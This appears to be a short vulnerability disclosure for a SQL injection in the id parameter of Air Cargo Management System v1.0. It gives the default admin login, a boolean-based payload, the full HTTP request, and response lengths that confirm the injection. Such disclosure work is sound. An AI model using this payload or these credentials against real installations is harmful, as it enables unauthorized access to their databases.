# Air Cargo Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: /acms/admin/cargo_types/manage_cargo_type.php?id=

Vulnerability location: /acms/admin/cargo_types/manage_cargo_type.php?id=,id

[+] Payload: /acms/admin/cargo_types/manage_cargo_type.php?id=2%27%20and%20length(database())%20=7%20--+ // Leak place ---> id

Current database name: acms_db,length is 7

```sql
GET /acms/admin/cargo_types/manage_cargo_type.php?id=2%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aaffvur9cmo069649rorqsbmeh
Connection: close
```

When length (database ()) = 6, Content-Length: 3017
![image](https://user-images.githubusercontent.com/54017627/166405679-db00db87-d73a-42d8-9515-2d5ce9f534a8.png)

![image](https://user-images.githubusercontent.com/54017627/166405733-a884b4fe-87a0-4d76-a832-2287dfdf5dd5.png)

When length (database ()) = 7, Content-Length: 3053
![image](https://user-images.githubusercontent.com/54017627/166405660-78aedfe1-d691-4985-83bd-031d15e9b769.png)

![image](https://user-images.githubusercontent.com/54017627/166405705-b91d8057-a221-4256-ae09-26cc176f5360.png)

